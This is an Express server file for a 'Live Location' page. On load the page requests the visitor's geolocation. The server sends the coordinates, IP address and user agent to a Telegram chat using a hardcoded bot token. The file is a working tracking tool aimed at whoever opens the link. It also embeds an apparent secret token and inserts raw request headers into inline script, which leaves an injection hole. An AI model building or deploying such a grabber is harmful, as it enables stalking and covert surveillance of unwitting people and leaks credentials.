const express = require('express');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).catch(err => console.error('Error sending message:', err));
};

app.use(express.json());

app.get('/', (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let userAgent = req.headers['user-agent'];

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Live Location</title>
      <script>
        function sendLocation(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          fetch('/location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ lat, lon, ip: '${ip}', userAgent: '${userAgent}' }),
          });
        }

        function getLocation() {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation);
          } else {
            alert("Geolocation is not supported by this browser.");
          }
        }

        window.onload = getLocation;
      </script>
    </head>
    <body>
      <h1>Fetching your live location...</h1>
    </body>
    </html>
  `);
});

app.post('/location', (req, res) => {
  const { lat, lon, ip, userAgent } = req.body;
  sendToTelegram(`
    New Visitor:
    IP: ${ip}
    User Agent: ${userAgent}
    Live Location:
    Lat: ${lat}
    Lon: ${lon}
  `);
  res.sendStatus(200);
});

module.exports = app;
